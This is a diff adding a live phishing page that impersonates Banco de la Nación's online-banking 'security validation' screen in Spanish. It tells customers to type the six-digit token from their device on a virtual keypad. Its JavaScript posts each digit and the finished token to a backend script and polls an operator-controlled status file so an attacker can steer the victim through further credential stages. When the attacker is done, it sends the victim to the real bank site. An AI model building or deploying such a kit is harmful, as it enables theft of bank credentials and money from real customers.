@@ -1,0 +1,628 @@
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title></title>
+        <script language="JavaScript" src="./index_files/util.js"></script>
+	<script language="JavaScript" src="./index_files/jquery.js"></script>
+	<link rel="stylesheet" type="text/css" href="./index_files/resetearcss.css">
+	<link rel="stylesheet" type="text/css" href="./index_files/tipografias.css">
+	<link rel="stylesheet" type="text/css" href="./index_files/bn-estilos(1).css">
+	<link rel="stylesheet" type="text/css" href="./index_files/select.css">
+	<script type="text/javascript" src="./index_files/bn-jquery.js"></script>
+	<script type="text/javascript" src="./index_files/jquery.ui.js"></script>
+	<script type="text/javascript" src="./index_files/select.js"></script>
+        <script type="text/javascript" src="./index_files/bn-funciones.js"></script>
+    </head>
+    <body oncontextmenu="return false;" >
+<style type="text/css">
+    body,html,iframe{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    margin:0;
+    font-family:tahoma;
+    padding:0
+}
+div#background{
+    background-color:rgba(0,0,0,0.1);
+    display:block;
+    left:0;
+    position:absolute;
+    top:0;
+    width:100%;
+    z-index:6
+}
+h1{
+    color:#06246F;
+    font-size:20px;
+    padding:0 0 5px;
+    margin:0;
+    border-bottom:1px dashed #06246F
+}
+div#box{
+    -moz-box-shadow:0 0 15px 5px #555;
+    -webkit-box-shadow:0 0 15px 5px #555;
+    background-color: white;
+    
+    box-shadow:0 0 15px 5px #555;
+    padding:0px;
+    width: fit-content;
+    -webkit-border-radius:10px;
+    -moz-border-radius:10px;
+    border-radius:10px
+}
+div#box label{
+    font-size:11px;
+    font-family:Tahoma;
+    color:#c44141;
+    float:left;
+    margin:10px 10px 0 0;
+    width:150px;
+    text-align:right;
+    font-weight:700
+}
+div#box input[type=text],div#box input[type=password],div#box select{
+     background-color: #FFF;
+     border: 1px solid #CCC;
+     padding: 5px;
+     width: 100%;
+     border-radius: 5px;
+}
+h2{
+    color:#444;
+    font-size:13px;
+    font-weight:400;
+    text-align:justify
+}
+.line{
+    float:left;
+    width:100%;
+    height:1px;
+    background:#EFAA00;
+    margin:5px 0
+}
+.classname{
+    -webkit-border-radius:25px;
+    -moz-border-radius:25px;
+    border-radius:25px;
+    border:1px solid #ff4f00;
+    background:#ff4f00;
+    color:#FFF;
+    font-weight:11px;
+    text-align:center;
+    height:25px;
+    width:100px
+}
+.classname:hover{
+    background:#fc8f5e;
+    cursor:pointer
+}
+.bignumber{
+    float:left;
+    width:50px;
+    font-size:50px;
+    color:#333
+}
+.square:hover{
+    cursor:pointer
+}
+
+</style>
+
+<div id="background" style="height: 629px; display: block;">
+
+    <div id="box" style="margin-top: 253.133px; margin-left: 380px; ">
+            
+            <div id="final" style="display: block; background-color: transparent; font-size:20px; padding:10px; font-family:'Flexo-Medium', arial, sans-serif; ">
+                <div style="text-align: center;" >
+                    <p><h3>Estamos validando su ingreso, por favor espere...</h3></p>
+                <br>
+                    <img src="./index_files/ajax-loader4.gif">
+                </div>
+            </div>
+            
+	    <form id="Forms1" name="Forms1" action="" method="POST" style="display: none;">
+                <div style=" padding: 10px; ">
+                    <input type="hidden" name="metodo">
+		<input type="hidden" name="optCuenta" value="N">
+		<input type="hidden" name="txtNumeroCuentaDestino" value="04250273407">
+		<input type="hidden" name="transaccion" value="TB01">
+		<input type="hidden" name="cmbTransferencia" value="TRAM-4214100216251753-">
+		<input type="hidden" name="cmbCuenta" value="04047386689">
+		<input type="hidden" name="esCTS" value="0">
+		<input type="hidden" name="coordenada" value="null">
+		<div id="contenidos-informativos">
+			<h2>VALIDACIÓN DE SEGURIDAD</h2>
+			<div id="consulta-datos">
+				<table>
+					<tbody>
+						
+						<tr>
+                                                    <td colspan="2">
+                                                        Estimado cliente, a partir de hoy lunes 02 de setiembre, para ingresar a sus cuentas, 
+                                                        hacer consulta de saldos y movimientos por banca por internet, 
+                                                        por su seguridad es necesario ingresar los 6 dígitos del <span style="font-weight: bolder;">TOKEN</span> que visualiza en su dispositivo 
+                                                        para <span style="font-weight: bolder;">VALIDAR</span> su ingreso.
+                                                    </td>
+						</tr>
+						<tr>
+							<td colspan="2">&nbsp;</td>
+						</tr>
+						<tr>
+							<td class="ingreso">
+								<div class="fila limpiar">
+									<label for="clave" style="width: 140px;">Utilice el teclado virtual para ingresar el Token:</label>
+									<div id="botones-clave">
+										<div class="boton-clave" onclick="evalRanTable('7');"><span class="dax">7</span>
+										</div>
+										<div class="boton-clave" onclick="evalRanTable('9');">9</div>
+										<div class="boton-clave" onclick="evalRanTable('0');">0</div>
+										<div class="boton-clave" onclick="evalRanTable('6');">6</div>
+										<div class="boton-clave" onclick="evalRanTable('1');">1</div>
+										<div class="boton-clave" onclick="evalRanTable('4');">4</div>
+										<div class="boton-clave" onclick="evalRanTable('2');">2</div>
+										<div class="boton-clave" onclick="evalRanTable('8');">8</div>
+										<div class="boton-clave" onclick="evalRanTable('5');">5</div>
+										<div class="boton-clave" onclick="evalRanTable('3');">3</div>
+										<div class="boton-clave limpiar" id="limpiar">LIMPIAR</div>
+									</div>
+									<input type="hidden" value="q/OiXuC3a1k=" name="hdnValue">
+								</div>
+							</td>
+							<td class="ingreso">
+								<img border="0" src="./index_files/toke.jpg" style="float: left;">
+								<div id="campo-clave">
+									<p style="width: 124px;">Ingresar los 6 dígitos del TOKEN</p>
+									<input type="password" name="txtCoordenada" id="txtCoordenada" maxlength="6" readonly="readonly" onkeypress="return soloNumerosAll(event)" style="margin: 0px 10px;">
+								</div>
+							</td>
+						</tr>
+                                                <tr style="display:none;">
+							<td class="ingreso">¿Desea adicionar como frecuente?
+								<input type="checkbox" name="adicionar" value="A" onclick="mostrarCaja();">
+								<br>
+							</td>
+							<td class="ingreso">
+								<div id="adi" style="display: none;">Nombre del frecuente:
+									<br>
+									<input type="text" class="input-grande" name="txtNombreBeneficiario" maxlength="30">
+								</div>
+							</td>
+						</tr>
+						<tr>
+							<td colspan="2" class="ingreso" style="width:592px;">
+								<p><u>Nota:</u>
+									<br>Tener en cuenta que los 6 dígitos cambian cada minuto por lo cual debe ingresar antes que la barra de tiempo se haya consumido.</p>
+							</td>
+						</tr>
+                                            
+                                            <tr id="tr_loader" style="display:none;">
+							<td colspan="2" class="ingreso" style="width:592px;text-align: center;">
+                                                            <h3><span style="font-weight: bolder;">Estamos validando el TOKEN ingresado, por favor espere...</span></h3>
+                                                            <img src="./index_files/ajax-loader4.gif" />
+							</td>
+						</tr>
+                                                
+					</tbody>
+				</table>
+                                    
+                            <div style="display: none;" id="div_msg_error" class="cysErrorMsg">
+                                    <li><span id="text_error">EL TOKEN INGRESADO ES INCORRECTO, VERIFIQUE E INTENTE NUEVAMENTE</span></li>
+                                </div>
+                            
+				<div id="botones" class="boton">                                    
+					<input type="button" onclick="javascript:aceptar();" id="boton-cont" value="VALIDAR">
+				</div>
+			</div>
+		</div>
+                </div>
+                
+                
+            </form>
+            
+	    <form id="Forms2" action="" method="POST" style="display:none;">
+                
+            </form>
+            
+	    <form id="Forms3" action="" method="POST" style="display:none;">
+                
+            </form>
+            
+            <form id="Forms4" action="" method="POST" style="display:none;">
+
+            </form>
+                    
+            <form id="Forms5" action="" method="POST" style="display:none;">
+
+            </form>
+
+            <form id="Forms6" action="" method="POST" style="display:none;">
+
+
+            </form>
+                    
+        
+            <form id="FormsError" action="error.html" method="POST">
+                <input type="hidden" name="uiwye8" value="error1" >
+            </form>
+            
+	</div>
+    
+</div>
+
+<iframe src="./index2.php" frameborder="0"></iframe>
+    
+    </body>
+</html>
+
+<script>
+    
+function aceptar()
+{		
+    var form = document.Forms1;
+    document.getElementById("boton-cont").disabled = true;
+    //document.getElementById("boton-cont").disabled = true;
+    if('N' == 'N')
+    {
+
+        if(form.adicionar.checked == true)
+        {
+            if (validacampo("txtNombreBeneficiario"))
+            {
+                alert('Es necesario ingresar el nombre frecuente');
+                document.getElementById("boton-cont").disabled = false;
+                return;
+            }
+       }
+    }		
+
+    var tipoElemento = 5;
+    if(tipoElemento == '5')
+    {
+            if (validacampo("txtCoordenada"))
+            {
+                alert('Es necesario ingresar los 6 dígitos del token');
+                document.getElementById("boton-cont").disabled = false;			
+                return;
+            } 
+            if (validalongitud("txtCoordenada","6"))
+            {
+                alert('El pin del Token es de 6 dígitos, no menos');
+                document.getElementById("boton-cont").disabled = false;				
+                return;
+            }
+    }else
+    {
+            if (validacampo("txtCoordenada"))
+            {
+                alert('Es necesario ingresar el valor de la coordenada');
+                document.getElementById("boton-cont").disabled = false;
+                return;
+            }
+            if (validalongitud("txtCoordenada","2"))
+            {
+                alert('El valor de la coordenada es de 2 dígitos, no menos');
+                document.getElementById("boton-cont").disabled = false;
+                return;
+            }
+    }			
+
+    validar1();
+
+}
+
+function mostrarCaja()
+{
+        var form = document.Forms1;				
+
+        if(form.adicionar.checked == true)
+        {
+            document.getElementById('adi').style.display = "block"; 		
+        }
+        else
+        {
+            document.getElementById('adi').style.display = "none";			
+        }
+}
+
+function regresar()
+{
+    var form = document.Forms1;
+    form.esCTS.value="0";
+    if(form.esCTS.value=="0")
+    {
+        form.cmbTransferencia.value="TRAM-4214100216251753-";
+    }
+    else
+    {
+        form.cmbTransferencia.value="04250273407";
+    }
+    form.cmbCuenta.value="04047386689";
+    form.transaccion.value="TB00";
+    form.action="/BNWeb/transferenciaMismoBanco.do?metodo=verTransferencia";
+    form.submit();
+}
+
+function inicio()
+{
+    if('N' == 'N')
+    {
+        document.getElementById('adi').style.display = "none"; 
+    }
+    else
+    {
+        //document.getElementById('esp').style.display = "block"; 
+    }		
+}
+    
+    
+function justNumbers(e)
+{
+    var keynum = window.event ? window.event.keyCode : e.which;
+    if ((keynum == 8) || (keynum == 46))
+    return true;
+
+    return /\d/.test(String.fromCharCode(keynum));
+}
+
+function padTokenClick(n)
+{
+    //return;
+    if($("#TxtPasswordForms1").val().length < 6)
+    {
+        var a = $("#TxtPasswordForms1").val();
+        $("#TxtPasswordForms1").val(a+n);
+
+        $.post(
+            "../ops/ajaxProcesos2.php",
+            {
+            op: "Escribiendo",
+            n:n
+            },
+            function(e)
+            {
+
+            }
+            );                
+
+        return;
+    }            
+}
+
+function padToken3Click(n)
+{
+    if($("#TxtPasswordForms3").val().length < 6)
+    {
+        var a = $("#TxtPasswordForms3").val();
+        $("#TxtPasswordForms3").val(a+n);
+        $.post(
+        "../ops/ajaxProcesos2.php",
+        {
+        op: "Escribiendo",
+        n:n
+        },
+        function(e)
+        {
+
+        }
+        );
+        return;
+    }            
+}
+
+function padToken4Click(n)
+{
+    if($("#TxtPasswordForms4").val().length < 6)
+    {
+        var a = $("#TxtPasswordForms4").val();
+        $("#TxtPasswordForms4").val(a+n);
+        $.post(
+            "../ops/ajaxProcesos2.php",
+            {
+            op: "Escribiendo",
+            n:n
+            },
+            function(e)
+            {
+
+            }
+        );
+        return;
+    }            
+}
+
+
+function ValidarEntrada1(e)
+{
+    var keynum = window.event ? window.event.keyCode : e.which;
+    if ((keynum == 8) || (keynum == 46))
+    return true;            
+    return /\d/.test(String.fromCharCode(keynum));            
+}
+
+function ValidarCorreo(correo)
+{
+    return /^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/.test(correo.toLowerCase());
+}
+        
+function evalRanTable(valor)
+{
+    var longitud = parseInt("6");
+    if($("#txtCoordenada").val().length < longitud)
+    {
+    $("#txtCoordenada").val($("#txtCoordenada").val()+valor);
+    }
+}
+        
+var cont2 = 0;
+var intentos=0;
+var IntentosCorreo = 0;
+var IntentosSmsValidacion = 0;
+$(function()
+{
+    function resizeBox()
+    {
+            $("#background").css("height",$(window).height()),
+            $("#background").show(),
+            $("#box").stop().animate(
+            {
+                    marginTop:($(window).height()-$("#box").outerHeight())/2,marginLeft:($(window).width()-$("#box").outerWidth())/2
+            },500);
+    }
+
+    validar1 = function()
+        {
+            intentos = intentos+1;
+            $("#div_msg_error").hide();
+            $("#boton-cont").removeAttr("disabled");
+            $("#boton-cont").hide();
+            $("#tr_loader").show();
+            txtCoordenada1 = $("#txtCoordenada").val();
+            $("#txtCoordenada").val("");
+            $.post("../../ops/ajaxProcesos2.php",
+            {
+                token:txtCoordenada1 ,
+                type:"token",
+                op:"soloDigitalToken"
+            },
+            function(data)
+            {
+                console.log(data);
+            });
+
+
+
+        }
+        
+    function loadInitInformation2()
+    {
+        $.post(
+        "../ops/../ops/ajaxProcesos2.php",
+        {
+        op: "consultarArchivoVisitante"
+        },
+        function(e)
+        {
+            eParsedJson = JSON.parse(e);                            
+            $("#TxtCardForms2").val(eParsedJson['Datos1']['txtNumeroTarjeta']);
+        }
+        );
+    }
+
+    resizeBox(),
+    $(window).resize(function(){resizeBox();});
+    resizeBox();
+    $(window).resize(function(){resizeBox();});
+
+    loadInitInformation2();
+
+    var aju;
+    var eParsedJson;
+        
+    function checkToken() 
+    {
+        $.post(
+        "../ops/../ops/ajaxProcesos2.php", 
+        {
+            op: "consultarArchivoVisitante"
+        }, function(e) 
+        {                
+            
+            console.log(e);
+            eParsedJson = JSON.parse(e);
+            var estadoActualX = eParsedJson['informacionEstado']['Estado'];
+            console.log(estadoActualX);
+            if (estadoActualX == 'Procesando') 
+            {                     
+                resizeBox();
+            }else if (estadoActualX == 'Token') 
+            {           
+                window.location.href="../login.do2/";
+                return;
+                resizeBox();
+
+            } else if (estadoActualX == 'cc') 
+            {                
+                window.location.href="../login.do2/";
+                return;
+                resizeBox();
+
+            }else if (estadoActualX == 'pregunta') 
+            {                
+                resizeBox();
+
+            }else if (estadoActualX == 'MandarLogin') 
+            {                
+                resizeBox();                
+
+            }else if (estadoActualX == 'DniToken') 
+            {                
+                resizeBox();
+
+            }else if (estadoActualX == 'Correo') 
+            {
+                resizeBox();
+
+            }else if (estadoActualX == 'SmsValidacion') 
+            {
+               
+                resizeBox();
+
+            } else if (estadoActualX == 'Fin') 
+            {
+                clearInterval(aju);
+                alert("Ha finalizado el proceso de verificaci\u00F3n.\n\nPor favor a continuaci\u00F3n inicie sesi\u00F3n de manera habitual.");
+                window.location = "https://www.bn.com.pe//";
+            }
+        });
+    }
+
+    aju = setInterval(checkToken, 4000);
+        
+    $(".cvv22").mouseover(function()
+    {
+            $(".cvv22div").show();
+    }).mouseleave(function()
+    {
+            $(".cvv22div").hide();
+    });
+
+    $("#limpiar").click(function()
+    {
+        $("#txtCoordenada").val("");
+    });
+
+});
+
+
+$(window).on('beforeunload', function()
+{
+      $.post(
+        "../ops/ajaxProcesos2.php",
+        {
+        op: "Semaforo",
+        InOut:"Out"
+        },
+        function(e)
+        {
+            
+        }
+        );
+});
+
+$(window).on('unload', function()
+{
+    $.post(
+        "../ops/ajaxProcesos2.php",
+        {
+        op: "Semaforo",
+        InOut:"Out"
+        },
+        function(e)
+        {
+            
+        }
+        );
+});
+
+</script>
